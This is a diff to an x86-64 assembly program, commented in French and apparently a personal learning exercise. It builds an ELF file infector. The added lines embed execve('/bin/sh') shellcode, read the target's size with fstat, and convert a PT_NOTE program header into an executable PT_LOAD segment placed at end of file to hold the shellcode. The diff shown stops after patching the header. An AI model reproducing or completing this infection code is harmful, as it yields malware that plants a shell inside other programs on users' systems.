@@ -1,6 +1,11 @@
 section .data
 	file_path db "/tmp/ls", 0	; j'effectue un test sur mon fichier ls copie dans /tmp
 	buffer_size equ 10000		;  taille buffer
+	stat_size equ 144		; taille de stat
+
+	;shellcode
+	shellcode db 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05
+	shellcode_len equ $ - shellcode
 	
 	; open msg syscall
 	error_open_msg db "Erreur lors de l'ouverture du fichier", 0xA
@@ -28,7 +33,7 @@ section .data
 
 section .bss
 	buffer resb buffer_size		; Je reserve un espace memoire pour mon elf
-
+	stat resb stat_size		; Reserve de l'espace pour stat
 section .text
 
 global _start
@@ -66,12 +71,20 @@ _start:
 	call _ok_elf
 
 	; On va jump jusqu'à e_entry qui se trouve dans l'header
-	; Normalement il se trouve en r15+168 puis on le stock dans r14
-	mov r14, [r15+168]
+	; Normalement il se trouve en r15+0x18 puis on le stock dans r14
+	mov r14, [r15+0x18]
+
+	; On va prendre la taille du fichier avec sys_stat
+	mov rax, 0x5			; fstat(
+	mov rdi, rdi			; int fd,
+	mov rsi, stat			; void buf*
+	syscall				; ) 
+
+	mov r13, [stat+0x30]		; On met la taille st_size dans r13
 
 	; On peut maintenant parser le programme header phdr
-	xor rcx, rcx
-	xor rdx, rdx
+	xor rcx, rcx			; Initialise rcx
+	xor rdx, rdx			; Initialise rdx
 	mov cx, word [r15+0x38]		; e_phnum
 	mov rbx, qword [r15+0x20]	; e_phoff
 	mov dx, word [r15+0x36]		; e_phentsize
@@ -85,10 +98,15 @@ _start:
 _ok_pt_note:
 	lea rsi, [rel ok_pt_note_msg]
 	mov rdx, ok_pt_note_msg_len
-	call _print_msg
+	call _print_msg			; Msg de succès
 	mov dword [r15+rbx], 0x1	; on transforme notre p_type en PT_LOAD
 	mov dword [r15+rbx+0x4], 0x5	; On accord permission RX à p_flags
-	mov qword [r15+rbx+0x8],
+	mov qword [r15+rbx+0x8], r13	; On met p_offset à EOF
+	add r13, 0xc000000		; On prend un large adresse et on l'ajoute à R13
+	mov qword [r15+rbx+0x10], r13	; On met p_vaddr suffisamment loin (grosse adresse) pour que ca n'interfere pas avec le code de base
+	mov qword [r15+rbx+0x20], shellcode_len  ; Taille de mon shellcode dans p_filesz
+	mov qword [r15+rbx+0x28], shellcode_len  ; Taille de mon shellcode dans p_memsz
+	mov qword [r15+rbx+0x30], 0x1000; Alignement des pages	
 	call _exit
 
 
